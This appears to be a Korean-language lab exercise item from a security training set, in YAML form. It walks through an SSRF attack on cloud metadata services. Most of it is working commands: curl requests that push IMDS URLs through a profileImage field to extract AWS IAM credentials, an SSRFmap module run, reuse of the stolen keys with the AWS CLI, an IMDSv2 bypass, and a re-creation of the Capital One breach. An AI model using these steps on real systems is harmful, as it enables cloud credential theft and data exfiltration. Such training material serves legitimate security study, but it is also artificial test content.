- order: 4
  instruction: |-
    {{WEB_IP}} 대상으로 클라우드 메타데이터 접근 시도를 수행하시오.

    ■ 실습 방법

    ▶ 1단계: 클라우드 별 메타데이터 endpoint
    | 클라우드 | URL | 헤더 |
    |---|---|---|
    | **AWS IMDSv1** | `http://169.254.169.254/latest/meta-data/` | (없음) |
    | **AWS IMDSv2** | `http://169.254.169.254/latest/api/token` (PUT 후 X-aws-ec2-metadata-token) | session token |
    | **GCP** | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` |
    | **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` |
    | **Alibaba** | `http://100.100.100.200/latest/meta-data/` | (없음) |
    | **Oracle Cloud** | `http://169.254.169.254/opc/v2/instance/` | `Authorization: Bearer Oracle` |
    | **DigitalOcean** | `http://169.254.169.254/metadata/v1/` | (없음) |

    ▶ 2단계: 도구 A — curl 으로 AWS IAM 자격증명 추출
    ```bash
    # SSRF endpoint 통해 AWS IMDS 접근
    curl -X PUT "http://10.20.30.80/api/Users/1" \
      -H "Authorization: Bearer $JWT" \
      -d '{"profileImage":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' -i

    # IAM role 이름 응답 받으면 그 이름으로 다시
    ROLE="ec2-app-role"
    curl -X PUT "http://10.20.30.80/api/Users/1" \
      -d "{\"profileImage\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\"}"

    # 응답 (JSON):
    # {
    #   "AccessKeyId": "ASIA...",
    #   "SecretAccessKey": "...",
    #   "Token": "...",
    #   "Expiration": "..."
    # }
    # → AWS CLI 로 사용 가능
    echo "클라우드 메타데이터 접근 시도 완료"
    ```

    ▶ 3단계: 도구 B — SSRFmap aws metadata 모듈
    ```bash
    cd ~/SSRFmap
    python3 ssrfmap.py -r request.txt -p url -m aws
    # AWS IMDS 자동 시도 + 자격증명 추출
    ```

    ▶ 4단계: 도구 C — 추출된 자격증명으로 AWS 접근
    ```bash
    export AWS_ACCESS_KEY_ID="ASIA..."
    export AWS_SECRET_ACCESS_KEY="..."
    export AWS_SESSION_TOKEN="..."
    aws sts get-caller-identity  # 권한 확인
    aws s3 ls  # 또는 다른 작업
    ```

    ▶ 5단계: IMDSv2 우회 (PUT 메서드)
    ```bash
    # SSRF 가 PUT 지원 시
    # 1. token 받기
    curl -X PUT "http://target/ssrf?url=http://169.254.169.254/latest/api/token" \
         -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT
    # 2. token 으로 메타데이터
    curl "http://target/ssrf?url=http://169.254.169.254/latest/meta-data/&header=X-aws-ec2-metadata-token:TOKEN"
    ```

    ▶ 6단계: 도구 D — Capital One 2019 사고 모방
    SSRF + AWS IMDS → IAM credentials → S3 1TB 데이터 유출.

    ▶ 7단계: 답변
    각 클라우드 응답 + 추출된 IAM credentials (snippets) quote + IMDSv2 권장 1 문장.

    **윤리**: 점검 환경 only. 실 IMDS 접근 시 자격증명 즉시 폐기.
